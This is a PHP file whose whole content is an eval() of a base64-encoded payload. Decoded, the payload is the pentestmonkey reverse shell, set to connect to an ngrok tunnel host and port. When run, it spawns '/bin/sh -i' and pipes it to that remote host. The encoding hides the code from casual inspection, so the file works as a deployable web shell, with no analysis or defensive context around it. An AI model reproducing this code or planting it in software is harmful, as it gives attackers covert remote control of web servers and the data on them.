<?php eval("?>".base64_decode("Ly8gcGhwLXJldmVyc2Utc2hlbGwgLSBBIFJldmVyc2UgU2hlbGwgaW1wbGVtZW50YXRpb24gaW4gUEhQDQovLyBDb3B5cmlnaHQgKEMpIDIwMDcgcGVudGVzdG1vbmtleUBwZW50ZXN0bW9ua2V5Lm5ldA0KLy8NCi8vIFRoaXMgdG9vbCBtYXkgYmUgdXNlZCBmb3IgbGVnYWwgcHVycG9zZXMgb25seS4gIFVzZXJzIHRha2UgZnVsbCByZXNwb25zaWJpbGl0eQ0KLy8gZm9yIGFueSBhY3Rpb25zIHBlcmZvcm1lZCB1c2luZyB0aGlzIHRvb2wuICBUaGUgYXV0aG9yIGFjY2VwdHMgbm8gbGlhYmlsaXR5DQovLyBmb3IgZGFtYWdlIGNhdXNlZCBieSB0aGlzIHRvb2wuICBJZiB0aGVzZSB0ZXJtcyBhcmUgbm90IGFjY2VwdGFibGUgdG8geW91LCB0aGVuDQovLyBkbyBub3QgdXNlIHRoaXMgdG9vbC4NCi8vDQovLyBJbiBhbGwgb3RoZXIgcmVzcGVjdHMgdGhlIEdQTCB2ZXJzaW9uIDIgYXBwbGllczoNCi8vDQovLyBUaGlzIHByb2dyYW0gaXMgZnJlZSBzb2Z0d2FyZTsgeW91IGNhbiByZWRpc3RyaWJ1dGUgaXQgYW5kL29yIG1vZGlmeQ0KLy8gaXQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSB2ZXJzaW9uIDIgYXMNCi8vIHB1Ymxpc2hlZCBieSB0aGUgRnJlZSBTb2Z0d2FyZSBGb3VuZGF0aW9uLg0KLy8NCi8vIFRoaXMgcHJvZ3JhbSBpcyBkaXN0cmlidXRlZCBpbiB0aGUgaG9wZSB0aGF0IGl0IHdpbGwgYmUgdXNlZnVsLA0KLy8gYnV0IFdJVEhPVVQgQU5ZIFdBUlJBTlRZOyB3aXRob3V0IGV2ZW4gdGhlIGltcGxpZWQgd2FycmFudHkgb2YNCi8vIE1FUkNIQU5UQUJJTElUWSBvciBGSVRORVNTIEZPUiBBIFBBUlRJQ1VMQVIgUFVSUE9TRS4gIFNlZSB0aGUNCi8vIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlIGZvciBtb3JlIGRldGFpbHMuDQovLw0KLy8gWW91IHNob3VsZCBoYXZlIHJlY2VpdmVkIGEgY29weSBvZiB0aGUgR05VIEdlbmVyYWwgUHVibGljIExpY2Vuc2UgYWxvbmcNCi8vIHdpdGggdGhpcyBwcm9ncmFtOyBpZiBub3QsIHdyaXRlIHRvIHRoZSBGcmVlIFNvZnR3YXJlIEZvdW5kYXRpb24sIEluYy4sDQovLyA1MSBGcmFua2xpbiBTdHJlZXQsIEZpZnRoIEZsb29yLCBCb3N0b24sIE1BIDAyMTEwLTEzMDEgVVNBLg0KLy8NCi8vIFRoaXMgdG9vbCBtYXkgYmUgdXNlZCBmb3IgbGVnYWwgcHVycG9zZXMgb25seS4gIFVzZXJzIHRha2UgZnVsbCByZXNwb25zaWJpbGl0eQ0KLy8gZm9yIGFueSBhY3Rpb25zIHBlcmZvcm1lZCB1c2luZyB0aGlzIHRvb2wuICBJZiB0aGVzZSB0ZXJtcyBhcmUgbm90IGFjY2VwdGFibGUgdG8NCi8vIHlvdSwgdGhlbiBkbyBub3QgdXNlIHRoaXMgdG9vbC4NCi8vDQovLyBZb3UgYXJlIGVuY291cmFnZWQgdG8gc2VuZCBjb21tZW50cywgaW1wcm92ZW1lbnRzIG9yIHN1Z2dlc3Rpb25zIHRvDQovLyBtZSBhdCBwZW50ZXN0bW9ua2V5QHBlbnRlc3Rtb25rZXkubmV0DQovLw0KLy8gRGVzY3JpcHRpb24NCi8vIC0tLS0tLS0tLS0tDQovLyBUaGlzIHNjcmlwdCB3aWxsIG1ha2UgYW4gb3V0Ym91bmQgVENQIGNvbm5lY3Rpb24gdG8gYSBoYXJkY29kZWQgSVAgYW5kIHBvcnQuDQovLyBUaGUgcmVjaXBpZW50IHdpbGwgYmUgZ2l2ZW4gYSBzaGVsbCBydW5uaW5nIGFzIHRoZSBjdXJyZW50IHVzZXIgKGFwYWNoZSBub3JtYWxseSkuDQovLw0KLy8gTGltaXRhdGlvbnMNCi8vIC0tLS0tLS0tLS0tDQovLyBwcm9jX29wZW4gYW5kIHN0cmVhbV9zZXRfYmxvY2tpbmcgcmVxdWlyZSBQSFAgdmVyc2lvbiA0LjMrLCBvciA1Kw0KLy8gVXNlIG9mIHN0cmVhbV9zZWxlY3QoKSBvbiBmaWxlIGRlc2NyaXB0b3JzIHJldHVybmVkIGJ5IHByb2Nfb3BlbigpIHdpbGwgZmFpbCBhbmQgcmV0dXJuIEZBTFNFIHVuZGVyIFdpbmRvd3MuDQovLyBTb21lIGNvbXBpbGUtdGltZSBvcHRpb25zIGFyZSBuZWVkZWQgZm9yIGRhZW1vbmlzYXRpb24gKGxpa2UgcGNudGwsIHBvc2l4KS4gIFRoZXNlIGFyZSByYXJlbHkgYXZhaWxhYmxlLg0KLy8NCi8vIFVzYWdlDQovLyAtLS0tLQ0KLy8gU2VlIGh0dHA6Ly9wZW50ZXN0bW9ua2V5Lm5ldC90b29scy9waHAtcmV2ZXJzZS1zaGVsbCBpZiB5b3UgZ2V0IHN0dWNrLg0KDQpzZXRfdGltZV9saW1pdCAoMCk7DQokVkVSU0lPTiA9ICIxLjAiOw0KJGlwID0gJzYudGNwLm5ncm9rLmlvJzsgIC8vIENIQU5HRSBUSElTIGJ1cmF5xLEgZGXEn2nFnw0KJHBvcnQgPSAxNjcxMzsgICAgICAgLy8gQ0hBTkdFIFRISVMgYnVyYXnEsSBkZcSfacWfDQokY2h1bmtfc2l6ZSA9IDE0MDA7DQokd3JpdGVfYSA9IG51bGw7DQokZXJyb3JfYSA9IG51bGw7DQokc2hlbGwgPSAndW5hbWUgLWE7IHc7IGlkOyAvYmluL3NoIC1pJzsNCiRkYWVtb24gPSAwOw0KJGRlYnVnID0gMDsNCg0KLy8NCi8vIERhZW1vbmlzZSBvdXJzZWxmIGlmIHBvc3NpYmxlIHRvIGF2b2lkIHpvbWJpZXMgbGF0ZXINCi8vDQoNCi8vIHBjbnRsX2ZvcmsgaXMgaGFyZGx5IGV2ZXIgYXZhaWxhYmxlLCBidXQgd2lsbCBhbGxvdyB1cyB0byBkYWVtb25pc2UNCi8vIG91ciBwaHAgcHJvY2VzcyBhbmQgYXZvaWQgem9tYmllcy4gIFdvcnRoIGEgdHJ5Li4uDQppZiAoZnVuY3Rpb25fZXhpc3RzKCdwY250bF9mb3JrJykpIHsNCgkvLyBGb3JrIGFuZCBoYXZlIHRoZSBwYXJlbnQgcHJvY2VzcyBleGl0DQoJJHBpZCA9IHBjbnRsX2ZvcmsoKTsNCgkNCglpZiAoJHBpZCA9PSAtMSkgew0KCQlwcmludGl0KCJFUlJPUjogQ2FuJ3QgZm9yayIpOw0KCQlleGl0KDEpOw0KCX0NCgkNCglpZiAoJHBpZCkgew0KCQlleGl0KDApOyAgLy8gUGFyZW50IGV4aXRzDQoJfQ0KDQoJLy8gTWFrZSB0aGUgY3VycmVudCBwcm9jZXNzIGEgc2Vzc2lvbiBsZWFkZXINCgkvLyBXaWxsIG9ubHkgc3VjY2VlZCBpZiB3ZSBmb3JrZWQNCglpZiAocG9zaXhfc2V0c2lkKCkgPT0gLTEpIHsNCgkJcHJpbnRpdCgiRXJyb3I6IENhbid0IHNldHNpZCgpIik7DQoJCWV4aXQoMSk7DQoJfQ0KDQoJJGRhZW1vbiA9IDE7DQp9IGVsc2Ugew0KCXByaW50aXQoIldBUk5JTkc6IEZhaWxlZCB0byBkYWVtb25pc2UuICBUaGlzIGlzIHF1aXRlIGNvbW1vbiBhbmQgbm90IGZhdGFsLiIpOw0KfQ0KDQovLyBDaGFuZ2UgdG8gYSBzYWZlIGRpcmVjdG9yeQ0KY2hkaXIoIi8iKTsNCg0KLy8gUmVtb3ZlIGFueSB1bWFzayB3ZSBpbmhlcml0ZWQNCnVtYXNrKDApOw0KDQovLw0KLy8gRG8gdGhlIHJldmVyc2Ugc2hlbGwuLi4NCi8vDQoNCi8vIE9wZW4gcmV2ZXJzZSBjb25uZWN0aW9uDQokc29jayA9IGZzb2Nrb3BlbigkaXAsICRwb3J0LCAkZXJybm8sICRlcnJzdHIsIDMwKTsNCmlmICghJHNvY2spIHsNCglwcmludGl0KCIkZXJyc3RyICgkZXJybm8pIik7DQoJZXhpdCgxKTsNCn0NCg0KLy8gU3Bhd24gc2hlbGwgcHJvY2Vzcw0KJGRlc2NyaXB0b3JzcGVjID0gYXJyYXkoDQogICAwID0+IGFycmF5KCJwaXBlIiwgInIiKSwgIC8vIHN0ZGluIGlzIGEgcGlwZSB0aGF0IHRoZSBjaGlsZCB3aWxsIHJlYWQgZnJvbQ0KICAgMSA9PiBhcnJheSgicGlwZSIsICJ3IiksICAvLyBzdGRvdXQgaXMgYSBwaXBlIHRoYXQgdGhlIGNoaWxkIHdpbGwgd3JpdGUgdG8NCiAgIDIgPT4gYXJyYXkoInBpcGUiLCAidyIpICAgLy8gc3RkZXJyIGlzIGEgcGlwZSB0aGF0IHRoZSBjaGlsZCB3aWxsIHdyaXRlIHRvDQopOw0KDQokcHJvY2VzcyA9IHByb2Nfb3Blbigkc2hlbGwsICRkZXNjcmlwdG9yc3BlYywgJHBpcGVzKTsNCg0KaWYgKCFpc19yZXNvdXJjZSgkcHJvY2VzcykpIHsNCglwcmludGl0KCJFUlJPUjogQ2FuJ3Qgc3Bhd24gc2hlbGwiKTsNCglleGl0KDEpOw0KfQ0KDQovLyBTZXQgZXZlcnl0aGluZyB0byBub24tYmxvY2tpbmcNCi8vIFJlYXNvbjogT2Njc2lvbmFsbHkgcmVhZHMgd2lsbCBibG9jaywgZXZlbiB0aG91Z2ggc3RyZWFtX3NlbGVjdCB0ZWxscyB1cyB0aGV5IHdvbid0DQpzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1swXSwgMCk7DQpzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1sxXSwgMCk7DQpzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1syXSwgMCk7DQpzdHJlYW1fc2V0X2Jsb2NraW5nKCRzb2NrLCAwKTsNCg0KcHJpbnRpdCgiU3VjY2Vzc2Z1bGx5IG9wZW5lZCByZXZlcnNlIHNoZWxsIHRvICRpcDokcG9ydCIpOw0KDQp3aGlsZSAoMSkgew0KCS8vIENoZWNrIGZvciBlbmQgb2YgVENQIGNvbm5lY3Rpb24NCglpZiAoZmVvZigkc29jaykpIHsNCgkJcHJpbnRpdCgiRVJST1I6IFNoZWxsIGNvbm5lY3Rpb24gdGVybWluYXRlZCIpOw0KCQlicmVhazsNCgl9DQoNCgkvLyBDaGVjayBmb3IgZW5kIG9mIFNURE9VVA0KCWlmIChmZW9mKCRwaXBlc1sxXSkpIHsNCgkJcHJpbnRpdCgiRVJST1I6IFNoZWxsIHByb2Nlc3MgdGVybWluYXRlZCIpOw0KCQlicmVhazsNCgl9DQoNCgkvLyBXYWl0IHVudGlsIGEgY29tbWFuZCBpcyBlbmQgZG93biAkc29jaywgb3Igc29tZQ0KCS8vIGNvbW1hbmQgb3V0cHV0IGlzIGF2YWlsYWJsZSBvbiBTVERPVVQgb3IgU1RERVJSDQoJJHJlYWRfYSA9IGFycmF5KCRzb2NrLCAkcGlwZXNbMV0sICRwaXBlc1syXSk7DQoJJG51bV9jaGFuZ2VkX3NvY2tldHMgPSBzdHJlYW1fc2VsZWN0KCRyZWFkX2EsICR3cml0ZV9hLCAkZXJyb3JfYSwgbnVsbCk7DQoNCgkvLyBJZiB3ZSBjYW4gcmVhZCBmcm9tIHRoZSBUQ1Agc29ja2V0LCBzZW5kDQoJLy8gZGF0YSB0byBwcm9jZXNzJ3MgU1RESU4NCglpZiAoaW5fYXJyYXkoJHNvY2ssICRyZWFkX2EpKSB7DQoJCWlmICgkZGVidWcpIHByaW50aXQoIlNPQ0sgUkVBRCIpOw0KCQkkaW5wdXQgPSBmcmVhZCgkc29jaywgJGNodW5rX3NpemUpOw0KCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTT0NLOiAkaW5wdXQiKTsNCgkJZndyaXRlKCRwaXBlc1swXSwgJGlucHV0KTsNCgl9DQoNCgkvLyBJZiB3ZSBjYW4gcmVhZCBmcm9tIHRoZSBwcm9jZXNzJ3MgU1RET1VUDQoJLy8gc2VuZCBkYXRhIGRvd24gdGNwIGNvbm5lY3Rpb24NCglpZiAoaW5fYXJyYXkoJHBpcGVzWzFdLCAkcmVhZF9hKSkgew0KCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTVERPVVQgUkVBRCIpOw0KCQkkaW5wdXQgPSBmcmVhZCgkcGlwZXNbMV0sICRjaHVua19zaXplKTsNCgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU1RET1VUOiAkaW5wdXQiKTsNCgkJZndyaXRlKCRzb2NrLCAkaW5wdXQpOw0KCX0NCg0KCS8vIElmIHdlIGNhbiByZWFkIGZyb20gdGhlIHByb2Nlc3MncyBTVERFUlINCgkvLyBzZW5kIGRhdGEgZG93biB0Y3AgY29ubmVjdGlvbg0KCWlmIChpbl9hcnJheSgkcGlwZXNbMl0sICRyZWFkX2EpKSB7DQoJCWlmICgkZGVidWcpIHByaW50aXQoIlNUREVSUiBSRUFEIik7DQoJCSRpbnB1dCA9IGZyZWFkKCRwaXBlc1syXSwgJGNodW5rX3NpemUpOw0KCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTVERFUlI6ICRpbnB1dCIpOw0KCQlmd3JpdGUoJHNvY2ssICRpbnB1dCk7DQoJfQ0KfQ0KDQpmY2xvc2UoJHNvY2spOw0KZmNsb3NlKCRwaXBlc1swXSk7DQpmY2xvc2UoJHBpcGVzWzFdKTsNCmZjbG9zZSgkcGlwZXNbMl0pOw0KcHJvY19jbG9zZSgkcHJvY2Vzcyk7DQoNCi8vIExpa2UgcHJpbnQsIGJ1dCBkb2VzIG5vdGhpbmcgaWYgd2UndmUgZGFlbW9uaXNlZCBvdXJzZWxmDQovLyAoSSBjYW4ndCBmaWd1cmUgb3V0IGhvdyB0byByZWRpcmVjdCBTVERPVVQgbGlrZSBhIHByb3BlciBkYWVtb24pDQpmdW5jdGlvbiBwcmludGl0ICgkc3RyaW5nKSB7DQoJaWYgKCEkZGFlbW9uKSB7DQoJCXByaW50ICIkc3RyaW5nXG4iOw0KCX0NCn0=")); ?>